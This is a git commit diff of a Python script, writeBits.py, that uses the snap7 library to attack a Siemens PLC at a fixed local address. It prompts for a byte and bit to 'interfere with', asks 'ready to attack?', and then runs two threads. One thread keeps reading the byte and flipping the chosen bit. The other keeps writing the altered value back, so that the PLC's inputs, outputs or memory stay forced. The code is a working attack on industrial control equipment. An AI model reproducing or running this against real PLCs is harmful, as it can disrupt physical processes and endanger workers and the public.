1e7abc35f77517b84d2a6f82b246dd00a1162a16
Sam <samfredc@gmail.com>
2023-09-02 14:38:15 +0100

    Introduced multithreading in order to separate byte monitoring and byte attacking, so that when the rest of the bits (that we want to remain unaltered) change, we can still only affect the intended bit, without slowing down the attacking thread.

--- writeBits.py
+++ writeBits.py
@@ -3,18 +3,21 @@ import snap7
 from snap7.util import *
 from snap7.types import *
 from contextlib import suppress
+import time
+import threading
 
 plc = snap7.client.Client()
 plc.connect("192.168.0.1", 0, 1)
+currentByte = [0]
 
 def inputFail(input, byteOrBit: int) -> int:
     try:
         valByte = int(input)
         if(byteOrBit == 0):
-            if(valByte < 0 or valByte >65525):
+            if(valByte < 0 or valByte > 65525):
                 raise ValueError
         if(byteOrBit == 1):
-            if(valByte < 0 or valByte>7):
+            if(valByte < 0 or valByte > 7):
                 raise ValueError
     except ValueError:
         if(byteOrBit == 0):
@@ -31,10 +34,6 @@ def getAndFlipBit(byte, bitPosition):
 startByte = inputFail(input("Which Byte do you want to interfere with? \n"), 0)
 whatBit = inputFail(input("Which Bit do you want to interfere with? \n"), 1)
 
-plc = snap7.client.Client()
-plc.connect("192.168.0.1", 0, 1)
-
-
 # PE = 0x81 -> Inputs
 # PA = 0x82 -> Outputs
 # MK = 0x83 -> Memorys
@@ -48,13 +47,43 @@ wordLength = WordLen.Byte
 
 readBytes = plc.read_area(area, 0, startByte, numberOfUnits)
 restingBit, toWriteByte = getAndFlipBit(readBytes[0], whatBit)
+toWriteArray = bytearray([toWriteByte])
 
-print(f"Overall Byte value is: {readBytes[0]} \n")
+print(f"Overall Byte value is: {readBytes[0]}")
+print(f"Byte Value to write Back is {toWriteByte}, {bytearray([toWriteByte])}")
 print(f"The resting value for your specified byte: {startByte} and specified bit: {whatBit} is bit value: {restingBit}")
 
-
 ready = input("Have you noted this down and are ready to attack? press y if ready")
-if(str(ready) != "y"):
-    sys.exit()
 
-print("running")
+def readPLCByte():
+    mask = 1 << whatBit
+    while True:
+        with suppress(RuntimeError):
+            readBytes = plc.read_area(area, 0, startByte, numberOfUnits)
+            currentByte[0] = readBytes[0]
+            currentByte[0] = mask ^ currentByte[0]
+            time.sleep(0.51)  # Sleep for 10ms to prevent overwhelming the PLC or CPU
+
+def writeFlippedBit():
+    while True:
+        with suppress(RuntimeError):  # Flip the bit and prepare to write
+            
+            plc.as_write_area(area, 0, startByte, numberOfUnits, wordLength, bytearray([currentByte[0]]))
+            
+writeThread = threading.Thread(target=writeFlippedBit)
+readThread = threading.Thread(target=readPLCByte)
+
+writeThread.start()
+readThread.start()
+
+writeThread.join()
+readThread.join()
+
+# if(str(ready) != "y"):
+#     sys.exit()
+# else:
+#     while(True):
+#         with suppress(RuntimeError):
+#             # readBytes = plc.read_area(area, 0, startByte, numberOfUnits)
+#             # toWrite = bytearray([mask & readBytes[0]])
+#             plc.as_write_area(area, 0, startByte, numberOfUnits, wordLength, toWriteArray)
